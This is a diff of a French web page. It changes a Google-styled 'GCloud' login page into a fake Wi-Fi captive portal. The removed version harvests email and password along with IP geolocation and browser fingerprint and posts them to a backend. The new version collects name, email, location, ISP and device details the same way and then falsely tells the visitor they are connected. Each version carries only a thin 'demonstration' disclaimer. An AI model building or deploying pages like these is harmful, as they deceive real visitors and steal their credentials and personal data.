@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Connexion – GCloud</title>
+  <title>Portail Wi-Fi – GCloud</title>
   <link href="https://fonts.googleapis.com/css2?family=Google+Sans&display=swap" rel="stylesheet" />
   <style>
     * {
@@ -72,15 +72,6 @@
       outline: none;
     }
 
-    .link {
-      display: block;
-      text-align: left;
-      font-size: 14px;
-      color: #1a73e8;
-      text-decoration: none;
-      margin-bottom: 30px;
-    }
-
     .btn {
       background-color: #1a73e8;
       color: #fff;
@@ -104,7 +95,6 @@
       margin-top: 24px;
     }
 
-    /* Media Queries pour les appareils mobiles */
     @media (max-width: 600px) {
       body {
         padding: 8px;
@@ -133,10 +123,6 @@
         font-size: 12px;
       }
 
-      .link {
-        font-size: 12px;
-      }
-
       .note {
         font-size: 10px;
       }
@@ -145,46 +131,42 @@
 </head>
 <body>
   <div class="container">
-    <div class="logo-placeholder">GC</div>
-    <h1>Connexion</h1>
-    <div class="subtext">Accédez à votre compte GCloud</div>
+    <div class="logo-placeholder">Wi-Fi</div>
+    <h1>Connexion au Wi-Fi</h1>
+    <div class="subtext">Veuillez vous identifier pour accéder à Internet</div>
 
-    <form id="login-form">
-      <input type="email" id="email" placeholder="Adresse e-mail" required />
-      <input type="password" id="password" placeholder="Mot de passe" required />
-      <a href="#" class="link">Mot de passe oublié ?</a>
-      <button type="submit" class="btn">Suivant</button>
+    <form id="wifi-login-form">
+      <input type="text" id="username" placeholder="Nom ou Prénom" required />
+      <input type="email" id="email" placeholder="Adresse e-mail (facultatif)" />
+      <button type="submit" class="btn">Se connecter</button>
     </form>
 
-    <div class="note">* Ceci est une démonstration pédagogique – aucun compte réel.</div>
+    <div class="note">* Portail captif fictif – démonstration uniquement.</div>
   </div>
 
 <script>
   let sessionStart = Date.now();
 
-  document.getElementById("login-form").addEventListener("submit", async function (e) {
+  document.getElementById("wifi-login-form").addEventListener("submit", async function (e) {
     e.preventDefault();
+    const username = document.getElementById("username").value;
     const email = document.getElementById("email").value;
-    const password = document.getElementById("password").value;
 
-    // Infos navigateur / système
+    // Infos système
     const userAgent = navigator.userAgent;
     const lang = navigator.language;
     const screenRes = `${window.screen.width}x${window.screen.height}`;
     const platform = navigator.platform;
     const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    const sessionDuration = Math.round((Date.now() - sessionStart) / 1000); // en secondes
+    const sessionDuration = Math.round((Date.now() - sessionStart) / 1000);
 
-    // Infos IP + géolocalisation via ipapi.co
+    // IP + Géo
     let geoInfo = {
       ip: "Inconnu",
       city: "Inconnue",
       region: "Inconnue",
       country: "Inconnu",
-      org: "Inconnu",
-      postal: "Inconnu",
-      latitude: "N/A",
-      longitude: "N/A"
+      org: "Inconnu"
     };
 
     try {
@@ -195,44 +177,38 @@
         city: data.city,
         region: data.region,
         country: data.country_name,
-        org: data.org,
-        postal: data.postal,
-        latitude: data.latitude,
-        longitude: data.longitude
+        org: data.org
       };
     } catch (err) {
-      console.error("Erreur récupération IP/Géo :", err);
+      console.error("Erreur récupération IP :", err);
     }
-    
+
     const message = `
-🔐 **Connexion**
-📧 Email : ${email}
-🔑 Mot de passe : ${password}
+📶 Nouvelle connexion Wi-Fi
+👤 Nom : ${username}
+📧 Email : ${email || "Non renseigné"}
+
 🌍 IP : ${geoInfo.ip}
-🏙️ Ville : ${geoInfo.city}
-📍 Région : ${geoInfo.region}
-🇨🇵 Pays : ${geoInfo.country}
+🏙️ Ville : ${geoInfo.city}, ${geoInfo.region}, ${geoInfo.country}
 🏢 FAI : ${geoInfo.org}
-📮 Code Postal : ${geoInfo.postal}
-📌 Coords : ${geoInfo.latitude}, ${geoInfo.longitude}
 
 🧭 Navigateur : ${userAgent}
 💻 Plateforme : ${platform}
-🗺️ Langue : ${lang}
-🕒 Fuseau horaire : ${timezone}
-📐 Résolution écran : ${screenRes}
-⏱️ Temps passé : ${sessionDuration} secondes
+🌐 Langue : ${lang}
+🕒 Temps passé : ${sessionDuration} sec
+📐 Écran : ${screenRes}
+🕓 Fuseau : ${timezone}
     `;
 
-   // Envoie des données au backend de Vercel
-   fetch("/api/send", {
-     method: "POST",
-     headers: { "Content-Type": "application/json" },
-     body: JSON.stringify({ content: message })
-   });
+    // Envoie vers backend (à adapter selon ton système)
+    fetch("/api/send", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ content: message })
+    });
 
-    alert("Merci ! Données de démo envoyées.");
-    document.getElementById("login-form").reset();
+    alert("Connexion acceptée. Vous pouvez maintenant naviguer.");
+    document.getElementById("wifi-login-form").reset();
   });
 </script>
 </body>
